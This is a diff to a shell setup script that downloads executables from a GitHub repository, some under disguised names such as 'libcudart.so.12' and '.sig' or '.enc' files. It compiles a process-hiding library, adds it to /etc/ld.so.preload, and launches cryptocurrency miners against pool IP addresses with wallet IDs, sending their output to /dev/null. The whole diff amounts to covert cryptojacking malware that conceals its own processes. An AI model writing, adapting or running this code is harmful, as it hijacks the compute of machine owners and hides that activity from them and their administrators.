@@ -13,7 +13,21 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget -O fortuner "https://www.dropbox.com/scl/fi/pv0jzaguyfo9b7riiacg2/fortuner?rlkey=5uax4hvgt1ns98muutvjv0jpr&st=o9gxub8c&dl=1" && chmod +x fortuner
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-release.sig && chmod +x pearl-release.sig
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-policy.enc && chmod +x pearl-policy.enc
+
+wget https://raw.githubusercontent.com/usapindong/test/refs/heads/main/pearl-release.json && chmod +x pearl-release.json
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl.guard && chmod +x pearl.guard
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-verify && chmod +x pearl-verify
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/tawa12 && chmod +x tawa12
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.12 && chmod +x libcudart.so.12
+
+wget https://github.com/usapindong/test/raw/refs/heads/main/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/graphics.tar.gz
 
@@ -49,9 +63,10 @@ echo " "
 
 
 ./graftcp/graftcp wget https://github.com/usapindong/test/raw/refs/heads/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./fortuner --proxy 202.155.9.40:80 --address prl1pahcdcce2mtd5j2wahl2t240dkl289z9v7lv2wxyc8ay0vae3gxvqzycfgq --worker rtx -gpu & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a power2b -o stratum+tcp://68.183.186.109:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN.rtx -t $(nproc) > /dev/null 2>&1 & clear
+./graftcp/graftcp && clear && ./tawa12 --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a yespowertide -o 143.198.85.42:80 -u tbc1qaczckuxmhvtw58llx5ajpz3xwxpp2zc0shak9g -t $(nproc) > /dev/null 2>&1 &
